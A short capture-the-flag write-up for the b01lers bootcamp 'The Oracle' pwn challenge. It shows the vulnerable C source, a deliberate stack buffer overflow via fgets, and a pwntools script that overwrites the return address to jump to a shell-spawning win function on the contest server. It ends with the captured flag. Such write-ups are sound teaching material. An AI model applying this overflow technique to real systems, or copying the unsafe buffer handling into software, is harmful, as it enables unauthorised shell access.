## b01lers bootcamp: The Oracle [pwn]
![](oracle_description.png)

#### This challenge was easier than the previous ones. We are given the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    char* argv[] = { NULL };
    char* envp[] = { NULL };

    execve("/bin/sh", argv, envp);
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    char buffer[16];

    printf("Know Thyself.\n");
    fgets(buffer, 128, stdin);
}

```
#### There is a simple buffer overflow vulnerability and a win function that we can call. Simply redirect code flow to this function then get the flag.
```python
from pwn import *

#: 
#p = process('./theoracle')
p = remote('chal.ctf.b01lers.com', 1015)
print(p.recv())

#:
exploit = cyclic(24)
exploit += p64(0x401196)
p.sendline(exploit)
p.interactive()

#: flag{Be1ng_th3_1_is_JusT_l1ke_b3ing_in_l0v3}
```